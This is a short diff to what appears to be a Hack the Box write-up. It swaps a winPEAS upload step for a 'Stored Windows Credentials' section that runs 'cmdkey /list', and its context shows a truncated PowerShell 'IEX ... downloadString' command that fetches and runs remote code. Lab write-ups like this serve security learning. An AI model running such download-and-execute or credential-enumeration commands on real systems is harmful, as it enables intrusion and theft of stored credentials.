@@ -187,8 +187,10 @@ C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadStri
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ad32556d-50f5-4ce8-8e35-28b43a952815)
 
-#### winPEAS
-  - Upload `winPEASx64.exe`.
+
+## Stored Windows Credentials
 ```CSS
-▶ 
+PS C:\Users\security\Desktop> cmdkey /list
 ```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cec4e58e-8623-4069-8037-e537471d27ef)
+
